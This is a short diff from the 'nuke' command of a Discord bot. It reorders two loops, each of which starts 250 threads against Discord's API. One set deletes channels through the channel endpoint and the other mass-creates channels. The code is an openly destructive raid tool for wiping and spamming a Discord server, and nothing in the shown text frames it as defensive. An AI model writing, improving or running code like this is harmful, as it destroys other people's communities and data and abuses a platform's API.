@@ -113,11 +113,6 @@ async def nuke(ctx):
           f"https://discord.com/api/v9/channels/{i}",
           headers=headers
         )
-    for i in range(250):
-           threading.Thread(
-             target=dc,
-             args=(channel.id, )
-           ).start()
     def cc(i):
         json = {
           "name": i
@@ -127,6 +122,11 @@ async def nuke(ctx):
           headers=headers,
           json=json
         )
+    for i in range(250):
+           threading.Thread(
+             target=dc,
+             args=(channel.id, )
+           ).start()
     for i in range(250):
            threading.Thread(
              target=cc,
